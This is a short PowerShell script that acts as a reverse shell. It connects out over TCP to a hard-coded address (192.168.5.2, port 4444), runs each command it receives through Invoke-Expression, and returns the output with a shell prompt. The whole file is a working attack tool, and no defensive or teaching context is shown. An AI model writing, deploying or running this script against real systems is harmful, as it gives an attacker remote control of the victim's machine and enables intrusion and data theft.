$ip = '192.168.5.2';
$port = 4444;

$client = New-Object System.Net.Sockets.TCPClient($ip, $port);

$stream = $client.GetStream();

[byte[]]$bytes = 0..65535 | ForEach-Object { 0 };

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { 
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); 
    $sendback = (Invoke-Expression ". { $data } 2>&1" | Out-String ); 
    Write-Output "About to execute received data: $data"
    $sendbackWithPrompt = $sendback + 'PS ' + (Get-Location).Path + '> '; 
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendbackWithPrompt); 
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
};

$client.Close()